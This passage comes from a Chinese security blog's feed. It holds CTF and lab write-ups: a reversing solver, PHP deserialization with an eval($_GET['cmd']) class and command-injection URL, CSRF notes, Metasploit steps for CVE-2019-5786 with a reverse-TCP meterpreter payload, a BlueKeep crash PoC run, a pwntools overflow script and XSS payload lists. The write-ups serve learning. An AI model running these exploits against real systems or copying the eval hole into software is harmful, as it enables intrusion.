class="hljs-keyword">else</span>:<br>        s +=<span class="hljs-built_in">key</span>[i]<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span>(<span class="hljs-number">0</span>,<span class="hljs-title function_">len</span>(<span class="hljs-built_in">text</span>)):<br>    <span class="hljs-keyword">for</span> j in <span class="hljs-built_in">loop</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">text</span>[i])==(<span class="hljs-title function_">ord</span>(j)<span class="hljs-number">-39</span>-<span class="hljs-title function_">ord</span>(s[i])+<span class="hljs-number">97</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>:<br>            flag+=j<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C语言脚本"> #include&lt;stdio.h&gt; <br>int main()<br>{<br>char key[] = "adsfkndcls";<br>char text[] = "killshadow";<br>int i;<br>int v3=10;//长度 <br>for (int i = 0; i &lt; 10; i++)<br>{<br>for (int j = 0; j &lt; 128; j++)<br>{<br>if (j &lt; 'A' || j &gt; 'z' || j &gt; 'Z' &amp;&amp; j &lt; 'a')<br>{<br>continue;<br>}<br>if ((j - 39 - key[v3 % 10] + 97) % 26 + 97 == text[i])<br>{<br>printf("%c",j);<br>v3++;<br>break;<br>}<br>}<br>}<br>}<br></code></pre></td></tr></tbody></table></figure><pre><code class="hljs">flag{KLDQCUDFZO}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;IDA打开查看字符串，直接点进&lt;code&gt;Congratulation&lt;/code&gt;找到关键函数&lt;code&gt;Decry()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;浅分析一下&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;figcaption&gt;&lt;sp</summary>
      
    
    
    
    
    <category term="Re" scheme="https://sinky.top/tags/Re/"/>
    
    <category term="Buu" scheme="https://sinky.top/tags/Buu/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="https://sinky.top/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://sinky.top/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-08-09T09:01:18.129Z</published>
    <updated>2022-08-11T14:18:28.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="序列化-serialize"><a href="#序列化-serialize" class="headerlink" title="序列化 serialize()"></a>序列化 serialize()</h2><p>序列化：把一个对象变成可以传输的字符串。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs <?php">class S{<br>public $test="pikachu";<br>}<br>$s=new S;//创建一个对象<br>serialize($s);//把这个对象进行序列化<br>?&gt;<br></code></pre></td></tr></tbody></table></figure><p>结果：O:1:”S”:1:{s:4:”test”;s:7:”pikachu”;}</p><p>O:代表object</p><p>1:代表对象名字长度为一个字符</p><p>S:对象的名称</p><p>1:代表对象里面有一个变量</p><p>s:数据类型</p><p>4:变量名称的长度</p><p>test:变量名称</p><p>s:数据类型</p><p>7:变量值的长度</p><p>pikachu:变量值</p><p>（什么鬼，没懂）</p><h2 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化 unserialize()"></a>反序列化 unserialize()</h2><p>就是把序列化的字符串还原为对象，然后在接下来的代码中继续使用。</p><pre><code class="hljs">$u=unserialize("0:1:"S":1{s:4:"test":s:7:"pikachu";}");echo $u ‐&gt; test;//得到结果为pikachu</code></pre><p>序列化和反序列化本身没有问题，但如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p><p><img src="https://s2.loli.net/2022/08/09/LkvmjC2rTAON7Pi.png" alt="image.png"></p><ul><li>常见的魔法函数：<ul><li><em>__construct()</em> 当一个对象创建时被调用</li><li><em>__destruct()</em> 当一个对象销毁时被调用</li><li><em>__toString()</em> 当一个对象被当作一个字符串使用</li><li><em>__sleep()</em> 在对象在被序列化之前运行</li><li><em>__wakeuop</em> 将在序列化之后立即被调用</li></ul></li></ul><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs <?php">//定义类<br>class test<br>{<br>//在对象被销毁时候自动调用destruct函数<br>function __destruct()<br>{<br>echo "&lt;br&gt;__destruct()&lt;br&gt;";<br>//在此函数中添加eval()以达到命令执行的目的<br>eval($_GET['cmd']);<br>}<br>}<br>//echo serialize($test);方便将序列化后的test写进u参数中传参<br>$test = new test;<br>echo serialize($test);<br>//执行完这个echo后会被垃圾回收器回收，也就是销毁<br>unserialize($_GET['u']);<br>//反序列化执行完后又会被回收<br>// 所以会出现两次destruct<br>?&gt;<br></code></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2022/08/09/obFRtxqgIyXBO9k.png" alt="image.png"></p><p>传参: <code>http://localhost/phptest.php?O:4:"test":0:{}&amp;cmd=system("woami");</code></p><p>利用成功。</p><h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h1><p><img src="https://s2.loli.net/2022/08/09/cl6J2puye5PkzTL.png" alt="image.png"></p><p>随便提交点啥字符串，提示“大兄弟，来点劲爆点儿的”</p><p>提交了一串序列化字符串，回显是反序列化后的。没啥思路，看一下后台代码。</p><p><img src="https://s2.loli.net/2022/08/09/F58nRZDKNG4VSXi.png" alt="image.png"></p><p>将XSS字符串 <code>&lt;script&gt;alert('xss')&lt;/script&gt; </code>序列化一下： <code>O:1:"S":1:{s:4:"test";s:29:"&lt;script&gt;alert('xss')&lt;/script&gt;";}</code></p><p>提交，成功</p><p><img src="https://s2.loli.net/2022/08/09/TVb9AHiwgLo812t.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;h2 id=&quot;序列化-serialize&quot;&gt;&lt;a href=&quot;#序列化-serialize&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="pikachu" scheme="https://sinky.top/tags/pikachu/"/>
    
  </entry>
  
  <entry>
    <title>pikachu-CSRF</title>
    <link href="https://sinky.top/2022/08/09/pikachu-CSRF/"/>
    <id>https://sinky.top/2022/08/09/pikachu-CSRF/</id>
    <published>2022-08-09T08:30:06.517Z</published>
    <updated>2022-08-09T08:51:43.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击.</p><h2 id="csrf攻击满足的条件"><a href="#csrf攻击满足的条件" class="headerlink" title="csrf攻击满足的条件"></a>csrf攻击满足的条件</h2><p>1、网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造</p><p>2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成</p><h2 id="csrf与xss的区别"><a href="#csrf与xss的区别" class="headerlink" title="csrf与xss的区别"></a>csrf与xss的区别</h2><p>csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。</p><h2 id="如何确认一个web系统存在csrf漏洞"><a href="#如何确认一个web系统存在csrf漏洞" class="headerlink" title="如何确认一个web系统存在csrf漏洞"></a>如何确认一个web系统存在csrf漏洞</h2><p>1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造</p><ul><li>修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；</li><li>对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；</li></ul><p>2.确认凭证的有效期</p><ul><li>虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。</li></ul><h1 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h1><p>登录账号，抓取修改个人信息流量包。</p><p><img src="https://s2.loli.net/2022/08/09/S596iH2b7vKtPh3.png" alt="image.png"></p><p>发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。</p><p>可以构造出CSRF攻击URL,诱使登录状态的用户点击url就可以完成CSRF攻击。</p><p>如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器），站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。</p><p>步骤同get。</p><p>正常登录状态：</p><p><img src="https://s2.loli.net/2022/08/09/noayh3NpcmPvMXq.png" alt="image.png"></p><p>点击恶意url后，用户信息直接被修改</p><p><img src="https://s2.loli.net/2022/08/09/usMpORoFZEmjqng.png" alt="image.png"></p><h1 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h1><p>token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。</p><p>如图获取修改信息流量包后发现增加了token，无法利用。</p><p><img src="https://s2.loli.net/2022/08/09/quSRzMEXBvVwPnK.png" alt="image.png"></p><h1 id="防范CSRF措施"><a href="#防范CSRF措施" class="headerlink" title="防范CSRF措施"></a>防范CSRF措施</h1><ul><li>增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样</li><li>安全的会话管理（避免会话被利用）<ul><li>不要再客户端保存敏感信息（身份认证信息）</li><li>测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。</li></ul></li><li>访问控制安全管理<ul><li>敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码）</li><li>敏感信息的修改尽量使用post（post安全性高于get）</li><li>通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer）</li></ul></li><li>增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CSRF&quot;&gt;&lt;a href=&quot;#CSRF&quot; class=&quot;headerlink&quot; title=&quot;CSRF&quot;&gt;&lt;/a&gt;CSRF&lt;/h1&gt;&lt;p&gt;CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成</summary>
      
    
    
    
    
    <category term="pikachu" scheme="https://sinky.top/tags/pikachu/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-5786</title>
    <link href="https://sinky.top/2022/08/09/CVE-2019-5786/"/>
    <id>https://sinky.top/2022/08/09/CVE-2019-5786/</id>
    <published>2022-08-09T08:02:35.739Z</published>
    <updated>2022-08-09T08:03:08.820Z</updated>
    
    <content type="html"><![CDATA[<p>前言：</p><p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali</p><p>win7_x86</p><p>Google_chrome_(32bit)_v72.0.3626.119</p><p>浏览下载链接推荐：<a href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p><pre><code class="hljs">root@kali:~# msfconsole -qmsf5 &gt; search chrome_filereader</code></pre><blockquote><p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p></blockquote><p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p><p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" alt="捕获.PNG"></p><h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p><ul><li><p>readyState：表示读取状态</p><ul><li>empty,0,尚未读取</li><li>loading,1,正在读取</li><li>done,2,读取完成</li></ul></li><li><p>result：表示读取结果，具体格式与读取方式有关：</p><ul><li>readAsArrayBuffer</li><li>readAsBinaryString</li><li>readAsDataURL</li><li>readAsText</li></ul></li><li><p>onprogress：回调函数</p><ul><li>读取Blob触发</li><li>当数据较多时会周期性触发多次</li></ul></li><li><p>onloadend：回调函数</p><ul><li>读取操作完成时触发，不论读取成功或失败</li></ul></li></ul><p>查看模块信息</p><p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" alt="捕获.PNG"></p><p>漏洞介绍：</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Payload information:<br>Description:<br>  This exploit takes advantage <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> use <span class="hljs-keyword">after</span> free vulnerability <span class="hljs-keyword">in</span> <br>  Google Chrome <span class="hljs-number">72.0</span><span class="hljs-number">.3626</span><span class="hljs-number">.119</span> running <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">7</span> <span class="hljs-title">x86</span>. <span class="hljs-title">The</span> <br>  FileReader.readAsArrayBuffer <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">can</span> <span class="hljs-title">return</span> <span class="hljs-title">multiple</span> <span class="hljs-title">references</span> </span><br>  <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> same ArrayBuffer object, which can be freed <span class="hljs-keyword">and</span> overwritten <br>  <span class="hljs-keyword">with</span> sprayed objects. The dangling ArrayBuffer reference can be used <br>  <span class="hljs-built_in">to</span> access <span class="hljs-keyword">the</span> sprayed objects, allowing arbitrary memory access <span class="hljs-built_in">from</span> <br>  Javascript. This is used <span class="hljs-built_in">to</span> <span class="hljs-built_in">write</span> <span class="hljs-keyword">and</span> execute shellcode <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <br>  WebAssembly object. The shellcode is executed <span class="hljs-keyword">within</span> <span class="hljs-keyword">the</span> Chrome <br>  sandbox, so you must explicitly disable <span class="hljs-keyword">the</span> sandbox <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> payload <br>  <span class="hljs-built_in">to</span> be successful.<br></code></pre></td></tr></tbody></table></figure><p>选择payload</p><pre><code class="hljs">-&gt; set payload windows/meterpreter/reverse_tcp</code></pre><blockquote><p>注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”</p></blockquote><p>设置payload参数：LHOST为kali ip</p><pre><code class="hljs">-&gt; set LHOST 192.168.119.128</code></pre><p><img src="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png" alt="捕获.PNG"></p><p>创建服务 <code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p><p><img src="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png" alt="捕获.PNG"></p><p>启动服务：run 或者exploit</p><p>在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe</p><pre><code class="hljs">-&gt; chrome.exe --no-sandbox</code></pre><p>在弹出的chome浏览器中访问kali ip: <a href="http://192.168.119.128:8080/">http://192.168.119.128:8080</a></p><p>kali获得sessions<br>查看sessions序号，通过反弹shell在win7上可执行命令。<br>复现结束。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.<br>虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。</p><pre><code class="hljs">https://github.com/exodusintel/CVE-2019-5786 </code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前言：&lt;/p&gt;
&lt;p&gt;这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境</summary>
      
    
    
    
    
    <category term="chrome_bug" scheme="https://sinky.top/tags/chrome-bug/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708</title>
    <link href="https://sinky.top/2022/08/09/CVE-2019-0708/"/>
    <id>https://sinky.top/2022/08/09/CVE-2019-0708/</id>
    <published>2022-08-09T04:25:01.135Z</published>
    <updated>2022-08-09T04:22:13.980Z</updated>
    
    <content type="html"><![CDATA[<p>2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。</p><p>影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7</p><h1 id="蓝屏"><a href="#蓝屏" class="headerlink" title="蓝屏"></a>蓝屏</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：kali IP：192.168.119.128</p><p>靶机：win7 IP:192.168.119.139 (开放3389端口)</p><p>工具：RDP漏洞扫描工具、MSF</p><p>POC：<a href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>nmap对win7端口扫描:</p><p><img src="https://i.loli.net/2020/07/13/Agj1dU2GY5JKZnW.png" alt="nmap扫描3389.PNG"></p><p>RDP工具在win7上扫描靶机:<code>0708detector.exe -t 192.168.119.139 -p 3389</code></p><p><img src="https://i.loli.net/2020/07/13/CwHJ1PRnel7cyu5.png" alt="漏扫工具扫描3389（win7自身）.PNG"></p><p>启动MSF<br>查找漏洞： <code>search 0708</code></p><p>利用漏洞扫描模块： <code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code></p><p>查看参数： <code>show options</code></p><p>设置靶机IP： <code>set rhosts 192.168.119.139</code></p><p>运行：<code>run</code></p><h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>在kali中安装pip3,安装impacket库。下载poc。<br>切进目录CVE-2019-0708</p><p>开始攻击： <code>python3 crashpoc.py 192.168.119.139 64(系统类型)</code></p><p>攻击成功，win7变为蓝屏。</p><p><img src="https://i.loli.net/2020/07/13/UN9urvOaMQxEDoC.png" alt="win7蓝屏.PNG"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h4 id="RDP协议"><a href="#RDP协议" class="headerlink" title="RDP协议"></a>RDP协议</h4><p>RDP,远程显示协议。传输方式：tcp/ip。提供了客户和服务器之间的连接。映像会话。<br>基本层次结构：</p><ul><li>网络连接层：RDP协议建立在tcp/ip协议之上，由于传输的数据量比较大，因此在协议的底层首先定义一层网络连接层，它定义了一个完整的RDP数据逻辑包，以避免由于网络包长度过长而被分割使数据丢失。</li><li>ISO数据层：在网络连接层之上是ISO数据层，标识RDP数据的正常连接通信。</li><li>虚拟通道层：在ISO数据层之上，RDP协议定义一个虚拟通道层，用以拆分标示不同虚拟通道的数据，加快客户端处理速度，节省占用网络接口的时间。</li><li>加密解密层：在虚拟通道层之上，RDP定义一个数据加密解密层，此层用于对所有的功能数据进行加密解密处理。</li><li>功能数据层：在加密解密层之上是功能数据，画面信息，本地资源转换，声音数据，打印数据等所有的功能数据信息都在此层进行处理。另外，根据数据类型的不同，这些数据都有各自不同层次的分割，</li></ul><p>连接过程说明：</p><ul><li>客户端连接服务器</li><li>ISO数据层建立连接</li><li>发送初始协议相关信息，接收加密、解密秘钥</li><li>虚拟通道申请</li><li>加密形式发送客户端系统信息，同时验证加密协议</li><li>平台软件证书验证</li><li>各功能建立连接，各功能数据传输，功能实现。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。&lt;/p&gt;
&lt;p&gt;影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="windows漏洞" scheme="https://sinky.top/tags/windows%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-pwn-反应釜开关控制</title>
    <link href="https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/"/>
    <id>https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/</id>
    <published>2022-08-09T04:18:04.404Z</published>
    <updated>2022-08-11T14:19:42.897Z</updated>
    
    <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h2><p><img src="https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png" alt="checksec.PNG"></p><ul><li>可以修改GOT表</li><li>可以通过一处的方式来更改程序运行流</li><li>堆栈不可执行</li><li>地址随机化未开启</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA查看，发现有/bin/sh。</p><p><img src="https://i.loli.net/2020/07/15/wLf32ASzvt5brWm.png" alt="shell.PNG"></p><p>get函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)=0x208h</p><p><img src="https://i.loli.net/2020/07/15/9mZH7GCz2u8LJq5.png" alt="v5.PNG"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>exp:</p><p><code> from pwn import * r = remote('220.249.52.133',39331) elf = ELF('./control') shell_addr = 0x04005F6 payload = 'A'*0x208 + p64(shell_addr) r.sendline(payload) r.interactive()</code></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了一下大佬的wp，结果原来是盲打题……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;checksec&quot;&gt;&lt;a href=&quot;#checksec&quot; class=&quot;headerlink&quot; title=&quot;checksec:&quot;&gt;&lt;/a&gt;checksec:&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/07/15/3D5q</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
    <category term="pwn" scheme="https://sinky.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>有关XSS跨站脚本</title>
    <link href="https://sinky.top/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/"/>
    <id>https://sinky.top/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/</id>
    <published>2022-08-09T04:10:35.381Z</published>
    <updated>2022-08-09T04:10:16.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS-跨站脚本-原理与分类"><a href="#XSS-跨站脚本-原理与分类" class="headerlink" title="XSS(跨站脚本)原理与分类"></a>XSS(跨站脚本)原理与分类</h1><p>跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。</p><p>XSS攻击针对的是用户层面的攻击.</p><ul><li>反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。</li><li>存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面。</li><li>DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型。</li></ul><h1 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h1><p>1.在目标上找输入点，比如查询接口、留言板</p><p>2.输入一组“特殊字符（&gt;,’,”等）+唯一识别字符”，点击提交后，查看返回源码，看后端返回数据是否有处理。</p><p>3.通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的调教（构造闭合）</p><p>4.提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行证明存在xss漏洞。</p><h1 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h1><ul><li><code>&lt;script&gt;</code>：最直接的xss有效载荷，脚本标记可以引用外部的javascript代码，也可以将代码插入脚本标记中。</li></ul><figure class="highlight plaintext"><figcaption><span>src</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs <script">&lt;script&gt;alert("hack")&lt;/script&gt; #弹出hack<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt; #弹出cookie<br></code></pre></td></tr></tbody></table></figure><ul><li><code>&lt;img&gt;</code>：<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert("hack")&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(/hack/)&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;  #弹出cookie<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(123)&gt;      注：对于数字，可以不用引号<br>&lt;img  <span class="hljs-attribute">src</span>=<span class="hljs-string">"javascript:alert("</span>XSS");"&gt;<br>&lt;img  <span class="hljs-attribute">dynsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br>&lt;img  <span class="hljs-attribute">lowsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br></code></pre></td></tr></tbody></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS-跨站脚本-原理与分类&quot;&gt;&lt;a href=&quot;#XSS-跨站脚本-原理与分类&quot; class=&quot;headerlink&quot; title=&quot;XSS(跨站脚本)原理与分类&quot;&gt;&lt;/a&gt;XSS(跨站脚本)原理与分类&lt;/h1&gt;&lt;p&gt;跨站脚本攻击XSS,为了不和层叠样式表的缩写</summary>
      
    
    
    
    
    <category term="XSS" scheme="https://sinky.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-dice_game</title>
    <link href="https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/"/>
    <id>https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/</id>
    <published>2022-08-09T04:08:11.395Z</published>
